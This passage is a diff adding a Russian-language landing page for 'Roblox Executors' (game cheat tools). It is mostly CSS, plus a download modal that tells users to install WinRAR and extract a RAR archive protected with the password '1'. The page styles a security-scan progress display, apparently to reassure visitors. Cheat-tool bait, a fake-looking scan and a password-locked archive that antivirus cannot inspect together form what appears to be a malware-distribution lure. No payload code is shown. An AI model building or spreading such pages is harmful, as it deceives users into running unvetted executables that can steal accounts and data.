@@ -1,0 +1,1519 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Executors | Premium Quality</title>
+    <style>
+        /* ===== БАЗОВЫЕ СТИЛИ И ПЕРЕМЕННЫЕ ===== */
+        :root {
+            --midnight-ink: #0a0e27;
+            --graphite-plate: #0f1735;
+            --steel-border: #1a2847;
+            --fog: #6b8aa8;
+            --pebble: #8fa3b8;
+            --moonlight: #d0e1f0;
+            --glacier: #e8f0f8;
+            --frost-link: #00bfff;
+            --electric-iris: #00d4ff;
+            --ember: #00e5ff;
+            --azure: #0099ff;
+            --cipher-mint: #00a8e8;
+            --blueprint-glow: #b3e5fc;
+            --green: #57ab5a;
+            --green-glow: rgba(87, 171, 90, 0.6);
+            --card-bg: rgba(15, 23, 53, 0.6);
+            --primary: #00bfff;
+            --primary-glow: rgba(0, 191, 255, 0.4);
+            --primary-hover: #00e5ff;
+            --text-main: #ffffff;
+            --text-muted: #a0bfd9;
+            --border-color: rgba(0, 191, 255, 0.25);
+            --nav-bg: rgba(10, 14, 39, 0.92);
+            --shadow-subtle: 0px 0px 0px 1px rgba(0, 191, 255, 0.1) inset;
+            --shadow-glow: 0 0 30px rgba(0, 191, 255, 0.2);
+            --font-sans: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            background: var(--midnight-ink);
+            color: var(--moonlight);
+            font-family: var(--font-sans);
+            min-height: 100vh;
+            overflow-x: hidden;
+            font-size: 16px;
+            line-height: 1.55;
+            letter-spacing: -0.015em;
+        }
+
+        /* ===== ФОН ===== */
+        .stars-bg, .dot-grid, .grid-floor, .horizon-glow, .grain {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .stars-bg {
+            background:
+                radial-gradient(90% 70% at 15% 10%, rgba(0,191,255,0.15) 0%, transparent 55%),
+                radial-gradient(70% 60% at 90% 80%, rgba(0,149,255,0.1) 0%, transparent 50%),
+                linear-gradient(165deg, #0a0e27 0%, #060d1a 45%, #0f1735 100%);
+        }
+        .dot-grid {
+            opacity: 0.07;
+            background-image:
+                linear-gradient(rgba(245,241,234,0.35) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(245,241,234,0.35) 1px, transparent 1px);
+            background-size: 48px 48px;
+            -webkit-mask-image: radial-gradient(ellipse at center, black 20%, transparent 75%);
+            mask-image: radial-gradient(ellipse at center, black 20%, transparent 75%);
+        }
+        .grid-floor {
+            height: 28vh;
+            top: auto;
+            background: linear-gradient(to top, rgba(0,149,255,0.08), transparent);
+        }
+        .horizon-glow {
+            height: 320px;
+            top: auto;
+            background: linear-gradient(to top, rgba(0,191,255,0.08) 0%, rgba(0,149,255,0.03) 40%, transparent 100%);
+            filter: blur(48px);
+        }
+        .grain {
+            opacity: 0.03;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+            background-repeat: repeat;
+            background-size: 180px;
+        }
+        .content { position: relative; z-index: 1; }
+
+        /* ===== НАВИГАЦИЯ ===== */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+            padding: 14px 28px;
+            background: rgba(10, 14, 39, 0.92);
+            backdrop-filter: blur(16px) saturate(1.2);
+            -webkit-backdrop-filter: blur(16px) saturate(1.2);
+            border-bottom: 1px solid rgba(0, 191, 255, 0.15);
+            transition: all 0.3s ease;
+        }
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--glacier);
+            font-family: var(--font-sans);
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .nav-logo {
+            width: 26px;
+            height: 26px;
+            background: linear-gradient(135deg, #00bfff, #0099ff);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #0a0e27;
+            box-shadow: 0 0 12px rgba(0, 191, 255, 0.6);
+            animation: logo-glow 2s ease-in-out infinite;
+        }
+        @keyframes logo-glow {
+            0%, 100% { box-shadow: 0 0 12px rgba(0, 191, 255, 0.6); }
+            50% { box-shadow: 0 0 20px rgba(0, 229, 255, 0.8); }
+        }
+        .nav-links {
+            display: flex;
+            gap: 4px;
+        }
+        .nav-link {
+            background: transparent;
+            border: none;
+            color: var(--pebble);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        .nav-link:hover {
+            color: #fff;
+            background: rgba(0, 191, 255, 0.15);
+            transform: translateY(-2px);
+        }
+        .nav-link.active {
+            color: var(--glacier);
+            background: rgba(0, 191, 255, 0.2);
+            box-shadow: inset 0 0 0 1px rgba(0, 191, 255, 0.3), 0 0 8px rgba(0, 191, 255, 0.3);
+        }
+        .nav-cta {
+            padding: 9px 18px;
+            background: linear-gradient(135deg, #00bfff, #0099ff);
+            color: #0a0e27;
+            font-size: 13px;
+            font-weight: 700;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 0 15px rgba(0, 191, 255, 0.4);
+        }
+        .nav-cta:hover {
+            background: linear-gradient(135deg, #00e5ff, #00bfff);
+            box-shadow: 0 0 25px rgba(0, 229, 255, 0.6);
+            transform: translateY(-2px) scale(1.05);
+        }
+
+        /* ===== ОСНОВНОЙ КОНТЕЙНЕР ===== */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        section {
+            display: none;
+            padding: 100px 0 60px;
+            animation: fadeOut 0.3s ease-out forwards;
+        }
+        section.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in forwards;
+        }
+        section.slide-up {
+            animation: slideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        section.slide-down {
+            animation: slideDown 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            to {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+        }
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @keyframes slideDown {
+            from {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            to {
+                opacity: 0;
+                transform: translateY(-40px);
+            }
+        }
+
+        /* ===== КАРТОЧКИ ИСПОЛНИТЕЛЕЙ ===== */
+        .executors-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+        .executor-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 25px;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+        .executor-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0,191,255,0.08), transparent);
+            transition: left 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .executor-card:hover::before { left: 200%; }
+        .executor-card:hover {
+            transform: translateY(-12px) scale(1.02);
+            box-shadow: 0 15px 40px var(--primary-glow), inset 0 0 20px rgba(0, 191, 255, 0.1);
+            border-color: var(--primary);
+        }
+        .executor-image {
+            width: 100%;
+            height: 160px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px dashed var(--border-color);
+            overflow: hidden;
+        }
+        .executor-image span {
+            font-size: 48px;
+            opacity: 0.6;
+        }
+        .executor-card h2 {
+            font-size: 1.6rem;
+            margin-bottom: 0.5rem;
+            color: #fff;
+        }
+        .executor-card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+            flex-grow: 1;
+            line-height: 1.5;
+        }
+        .download-btn {
+            background: linear-gradient(135deg, #00bfff, #0099ff);
+            color: white;
+            border: none;
+            text-decoration: none;
+            text-align: center;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 5px 20px rgba(0, 191, 255, 0.4);
+            display: inline-block;
+            width: 100%;
+            font-size: 0.9rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s ease;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(0, 191, 255, 0.6);
+        }
+        .download-btn:hover::before {
+            left: 100%;
+        }
+
+        /* ===== СЕКЦИИ (Features, Reviews, Updates, Install, CTA) ===== */
+        .section-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .section-eyebrow {
+            font-family: var(--font-mono);
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            color: var(--electric-iris);
+            margin-bottom: 16px;
+        }
+        .section-title {
+            font-size: clamp(28px, 4vw, 42px);
+            font-weight: 700;
+            color: var(--glacier);
+            line-height: 1.12;
+            letter-spacing: -0.03em;
+            margin-bottom: 16px;
+        }
+        .section-desc {
+            font-size: 18px;
+            color: var(--pebble);
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin-top: 40px;
+        }
+        .feature-card {
+            padding: 24px;
+            border-radius: 12px;
+            background: rgba(15, 23, 53, 0.5);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 191, 255, 0.15);
+            border-left: 3px solid rgba(0, 191, 255, 0.6);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(0, 191, 255, 0.1), transparent);
+            opacity: 0;
+            transition: all 0.5s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 12px 35px rgba(0, 191, 255, 0.25), inset 0 0 20px rgba(0, 191, 255, 0.08);
+            border-color: rgba(0, 191, 255, 0.4);
+        }
+        .feature-card:hover::before {
+            opacity: 1;
+            top: -50%; left: -50%;
+        }
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+        .feature-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--glacier);
+        }
+        .feature-desc {
+            font-size: 0.9rem;
+            color: var(--pebble);
+            line-height: 1.5;
+        }
+
+        .reviews-section {
+            overflow: hidden;
+            padding: 60px 0;
+        }
+        .marquee-mask {
+            position: relative;
+            -webkit-mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+            mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+        }
+        .marquee-row {
+            display: flex;
+            width: max-content;
+            gap: 20px;
+            padding: 10px 0;
+            animation: marquee-left 40s linear infinite;
+        }
+        .marquee-row-2 { animation-direction: reverse; }
+        @keyframes marquee-left {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        .review-card {
+            flex-shrink: 0;
+            width: 320px;
+            padding: 20px 24px;
+            background: rgba(0, 149, 255, 0.05);
+            border: 1px solid rgba(0, 191, 255, 0.15);
+            border-radius: 14px;
+            backdrop-filter: blur(8px);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .review-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(0, 191, 255, 0.3);
+            box-shadow: 0 8px 20px rgba(0, 191, 255, 0.15);
+        }
+        .review-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        .review-user { display: flex; align-items: center; gap: 10px; }
+        .review-avatar {
+            width: 36px; height: 36px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 600; color: #fff; font-size: 13px;
+        }
+        .review-name { font-size: 14px; font-weight: 600; color: var(--glacier); }
+        .review-handle { font-size: 12px; color: var(--pebble); opacity: 0.6; }
+        .review-stars { color: #f5c543; }
+        .review-text { font-size: 13.5px; color: var(--fog); line-height: 1.55; }
+
+        .updates-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 48px;
+            margin-top: 40px;
+        }
+        .changelog { position: relative; padding-left: 30px; }
+        .changelog::before {
+            content: '';
+            position: absolute;
+            left: 7px;
+            top: 6px;
+            bottom: 6px;
+            width: 1px;
+            background: linear-gradient(180deg, var(--electric-iris), rgba(186, 215, 247, 0.06));
+        }
+        .cl-entry {
+            display: flex;
+            gap: 20px;
+            padding: 12px 0;
+            position: relative;
+        }
+        .cl-dot {
+            width: 15px; height: 15px;
+            border-radius: 50%;
+            background: var(--midnight-ink);
+            border: 2px solid var(--electric-iris);
+            flex-shrink: 0;
+            margin-top: 2px;
+            position: absolute;
+            left: -22px;
+        }
+        .cl-version { font-family: var(--font-mono); font-weight: 500; color: var(--glacier); }
+        .cl-tag { font-size: 10px; font-weight: 600; text-transform: uppercase; padding: 2px 8px; border-radius: 2px; margin-left: 10px; }
+        .cl-tag-new { background: rgba(212, 137, 58, 0.15); color: var(--electric-iris); }
+        .cl-tag-fix { background: rgba(87, 171, 90, 0.12); color: #57ab5a; }
+        .cl-tag-perf { background: rgba(184, 115, 51, 0.12); color: var(--azure); }
+        .cl-changes { list-style: none; margin-top: 6px; }
+        .cl-changes li { font-size: 14px; color: var(--pebble); padding-left: 14px; position: relative; margin-bottom: 4px; }
+        .cl-changes li::before { content: '·'; position: absolute; left: 0; color: var(--fog); }
+
+        .faq-item {
+            border-radius: 10px;
+            background: rgba(0, 149, 255, 0.06);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 191, 255, 0.15);
+            margin-bottom: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        .faq-item:hover {
+            border-color: rgba(0, 191, 255, 0.35);
+            box-shadow: 0 4px 15px rgba(0, 191, 255, 0.1);
+        }
+        .faq-q {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 20px;
+            cursor: pointer;
+            user-select: none;
+            font-weight: 500;
+            color: var(--glacier);
+        }
+        .faq-arrow { transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .faq-item.open .faq-arrow { transform: rotate(180deg); }
+        .faq-a {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.35s ease, padding 0.35s ease;
+            padding: 0 20px;
+            color: var(--pebble);
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+        .faq-item.open .faq-a {
+            max-height: 200px;
+            padding: 0 20px 18px;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin-top: 40px;
+        }
+        .step-card {
+            padding: 24px;
+            border-radius: 10px;
+            background: rgba(0, 149, 255, 0.08);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 191, 255, 0.2);
+            text-align: center;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .step-card::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(0, 229, 255, 0.15), transparent);
+            opacity: 0;
+            transition: all 0.5s ease;
+        }
+        .step-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 12px 30px rgba(0, 191, 255, 0.25);
+            border-color: rgba(0, 191, 255, 0.35);
+        }
+        .step-card:hover::before {
+            opacity: 1;
+        }
+        .step-num {
+            font-family: var(--font-mono);
+            font-size: 28px;
+            font-weight: 500;
+            color: var(--electric-iris);
+            opacity: 0.5;
+            margin-bottom: 12px;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); opacity: 0.5; }
+            50% { transform: translateY(-5px); opacity: 0.8; }
+        }
+        .step-title { font-weight: 600; margin-bottom: 8px; }
+        .step-desc { font-size: 0.9rem; color: var(--pebble); }
+
+        .cta-section {
+            text-align: center;
+            padding: 80px 0;
+            position: relative;
+        }
+        .cta-wrap {
+            background: rgba(10, 14, 39, 0.95);
+            border-radius: 12px;
+            padding: 60px 30px;
+            border: 1px solid rgba(0, 191, 255, 0.3);
+            box-shadow: 0 0 40px rgba(0, 191, 255, 0.15), inset 0 0 30px rgba(0, 191, 255, 0.05);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .cta-wrap::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(0, 191, 255, 0.5), transparent);
+            animation: line-glow 2s ease-in-out infinite;
+        }
+        @keyframes line-glow {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        .cta-wrap:hover {
+            border-color: rgba(0, 191, 255, 0.5);
+            box-shadow: 0 0 50px rgba(0, 191, 255, 0.25), inset 0 0 30px rgba(0, 191, 255, 0.1);
+        }
+        .cta-title {
+            font-size: clamp(28px, 4vw, 42px);
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        .cta-desc {
+            font-size: 18px;
+            color: var(--pebble);
+            max-width: 500px;
+            margin: 0 auto 30px;
+        }
+
+        .dl-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 2000;
+            background: rgba(10, 14, 39, 0.85);
+            backdrop-filter: blur(16px) saturate(1.3);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: overlay-fade 0.3s ease;
+        }
+        @keyframes overlay-fade {
+            from { background: rgba(10, 14, 39, 0); }
+            to { background: rgba(10, 14, 39, 0.85); }
+        }
+        .dl-overlay.open {
+            display: flex;
+        }
+        .dl-modal {
+            width: 520px;
+            max-width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            border-radius: 16px;
+            background: rgba(10, 14, 39, 0.95);
+            backdrop-filter: blur(32px);
+            border: 1px solid rgba(0, 191, 255, 0.25);
+            box-shadow: 0 0 60px rgba(0, 191, 255, 0.2), 0 32px 64px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            position: relative;
+            animation: modal-pop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        @keyframes modal-pop {
+            from { transform: scale(0.95) translateY(-20px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
+        }
+        .dl-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(0, 191, 255, 0.15);
+            padding-bottom: 14px;
+        }
+        .dl-header-icon {
+            width: 36px; height: 36px;
+            border-radius: 8px;
+            background: rgba(0, 191, 255, 0.15);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
+        }
+        .dl-close {
+            position: absolute;
+            top: 20px; right: 20px;
+            width: 30px; height: 30px;
+            background: rgba(0, 191, 255, 0.1);
+            border: 1px solid rgba(0, 191, 255, 0.2);
+            border-radius: 8px;
+            color: var(--fog);
+            cursor: pointer;
+            font-size: 14px;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.2s ease;
+        }
+        .dl-close:hover {
+            background: rgba(0, 191, 255, 0.25);
+            border-color: rgba(0, 191, 255, 0.4);
+            color: #00bfff;
+        }
+        .dl-steps {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+        .dl-step {
+            display: flex;
+            gap: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 149, 255, 0.08);
+            border: 1px solid rgba(0, 191, 255, 0.12);
+            font-size: 13px;
+            transition: all 0.2s ease;
+        }
+        .dl-step:hover {
+            background: rgba(0, 191, 255, 0.15);
+            border-color: rgba(0, 191, 255, 0.25);
+        }
+        .dl-step-icon {
+            width: 24px; height: 24px;
+            border-radius: 6px;
+            background: rgba(0, 191, 255, 0.15);
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+            font-size: 12px;
+        }
+        .dl-step-title { font-weight: 500; color: var(--glacier); }
+        .dl-step-desc { font-size: 12px; color: var(--fog); }
+
+        .dl-scan {
+            background: rgba(0, 149, 255, 0.08);
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(0, 191, 255, 0.15);
+        }
+        .scan-shield {
+            width: 28px; height: 28px;
+            border-radius: 6px;
+            background: rgba(0, 191, 255, 0.15);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 14px;
+            animation: shield-pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes shield-pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 8px rgba(0, 191, 255, 0.3); }
+            50% { transform: scale(1.1); box-shadow: 0 0 15px rgba(0, 191, 255, 0.6); }
+        }
+        .scan-bar {
+            height: 4px;
+            border-radius: 2px;
+            background: rgba(0, 191, 255, 0.1);
+            overflow: hidden;
+        }
+        .scan-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00bfff, #00e5ff);
+            transition: width 0.2s ease;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+        .scan-chip {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            flex: 0 0 calc(33.33% - 4px);
+            background: rgba(0, 149, 255, 0.1);
+            border: 1px solid rgba(0, 191, 255, 0.15);
+            color: var(--fog);
+            font-family: var(--font-mono);
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+        .scan-chip.active {
+            border-color: rgba(0, 191, 255, 0.5);
+            color: #00bfff;
+            background: rgba(0, 191, 255, 0.2);
+            animation: chip-pulse 0.6s ease-in-out;
+        }
+        @keyframes chip-pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 191, 255, 0.7); }
+            100% { box-shadow: 0 0 0 6px rgba(0, 191, 255, 0); }
+        }
+        .scan-chip.pass {
+            border-color: rgba(87, 171, 90, 0.4);
+            color: #57ab5a;
+            background: rgba(87, 171, 90, 0.12);
+        }
+        .scan-pct {
+            font-family: var(--font-mono);
+            color: #00bfff;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .dl-footer {
+            text-align: center;
+        }
+        .dl-btn {
+            width: 100%;
+            padding: 13px 16px;
+            background: linear-gradient(135deg, #00bfff, #0099ff);
+            color: #0a0e27;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 0 20px rgba(0, 191, 255, 0.3);
+        }
+        .dl-btn:hover:not(:disabled) {
+            background: linear-gradient(135deg, #00e5ff, #00bfff);
+            box-shadow: 0 0 30px rgba(0, 229, 255, 0.6);
+            transform: translateY(-2px);
+        }
+        .dl-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .dl-progress {
+            position: absolute;
+            left: 0; top: 0;
+            height: 100%;
+            background: rgba(255,255,255,0.08);
+            transition: width 0.3s;
+        }
+        .dl-hint {
+            font-size: 12px;
+            color: var(--fog);
+            margin-top: 8px;
+        }
+
+        .dl-success {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .dl-success.show { display: block; }
+        .success-check-wrap {
+            position: relative;
+            width: 56px; height: 56px;
+            margin: 0 auto 20px;
+        }
+        .success-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 1.5px solid var(--electric-iris);
+            opacity: 0;
+            animation: ring-out 1.2s ease-out forwards;
+        }
+        .success-ring-2 { animation-delay: 0.2s; }
+        @keyframes ring-out {
+            0% { transform: scale(0.5); opacity: 0.8; }
+            100% { transform: scale(2.2); opacity: 0; }
+        }
+        .success-check {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #57ab5a;
+            animation: check-pop 0.4s ease;
+        }
+        @keyframes check-pop {
+            0% { transform: scale(0); }
+            60% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        .success-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .success-sub { font-size: 14px; color: var(--fog); margin-bottom: 20px; }
+        .pass-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(0, 191, 255, 0.08);
+            border: 2px solid rgba(0, 191, 255, 0.35);
+            border-radius: 14px;
+            padding: 14px 20px;
+            margin: 16px 0;
+            cursor: pointer;
+            animation: pass-glow-pulse 2.5s ease-in-out infinite;
+            transition: all 0.3s ease;
+        }
+        .pass-box:hover {
+            border-color: rgba(0, 191, 255, 0.6);
+            box-shadow: 0 0 30px rgba(0, 191, 255, 0.25);
+            transform: translateY(-2px);
+        }
+        @keyframes pass-glow-pulse {
+            0%, 100% { box-shadow: 0 0 15px rgba(0, 191, 255, 0.2); }
+            50% { box-shadow: 0 0 25px rgba(0, 191, 255, 0.4); }
+        }
+        .pass-label {
+            font-family: var(--font-mono);
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            color: rgba(0, 191, 255, 0.6);
+        }
+        .pass-value {
+            font-family: var(--font-mono);
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 6px;
+            background: linear-gradient(90deg, #00bfff, #00e5ff, #0099ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: value-glow 2s ease-in-out infinite;
+        }
+        @keyframes value-glow {
+            0%, 100% { filter: drop-shadow(0 0 0px rgba(0, 191, 255, 0)); }
+            50% { filter: drop-shadow(0 0 8px rgba(0, 191, 255, 0.5)); }
+        }
+        .pass-copy-btn {
+            padding: 8px 18px;
+            background: rgba(0, 191, 255, 0.12);
+            border: 1px solid rgba(0, 191, 255, 0.3);
+            border-radius: 10px;
+            color: #00bfff;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .pass-copy-btn:hover {
+            background: rgba(0, 191, 255, 0.25);
+            border-color: rgba(0, 191, 255, 0.6);
+            color: #fff;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 191, 255, 0.3);
+        }
+
+        /* ===== АДАПТИВНОСТЬ ===== */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .features-grid, .steps-grid { grid-template-columns: 1fr 1fr; }
+            .updates-grid { grid-template-columns: 1fr; gap: 32px; }
+            .executors-grid { grid-template-columns: 1fr; }
+            .dl-steps { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 480px) {
+            .features-grid, .steps-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Фоновые слои -->
+    <div class="stars-bg"></div>
+    <div class="dot-grid"></div>
+    <div class="grid-floor"></div>
+    <div class="horizon-glow"></div>
+    <div class="grain"></div>
+
+    <!-- Модальное окно -->
+    <div class="dl-overlay" id="dl-overlay">
+        <div class="dl-modal">
+            <div class="dl-header">
+                <div class="dl-header-icon">⬇</div>
+                <div class="dl-header-text">
+                    <h2 id="dl-title">Скачивание файла</h2>
+                    <p id="dl-subtitle">Подготовка к установке</p>
+                </div>
+                <button class="dl-close" id="dl-close">✕</button>
+            </div>
+            <div class="dl-steps" id="dl-steps-block">
+                <div class="dl-step">
+                    <div class="dl-step-icon">📁</div>
+                    <div>
+                        <div class="dl-step-title">Скачайте WinRAR</div>
+                        <div class="dl-step-desc"><a href="https://www.rarlab.com/rar_add.htm" target="_blank" style="color:#00bfff; text-decoration:underline;">rarlab.com</a> или встроенный архиватор</div>
+                    </div>
+                </div>
+                <div class="dl-step">
+                    <div class="dl-step-icon">📁</div>
+                    <div>
+                        <div class="dl-step-title">Распакуйте RAR</div>
+            <div class="dl-step-desc">ПКМ → Извлечь всё в WinRAR</div>
+                    </div>
+                </div>
+                <div class="dl-step">
+                    <div class="dl-step-icon">🔑</div>
+                    <div>
+                        <div class="dl-step-title">Пароль архива</div>
+                        <div class="dl-step-desc">Пароль: <strong style="color:#00e5ff;">1</strong></div>
+                    </div>
+                </div>
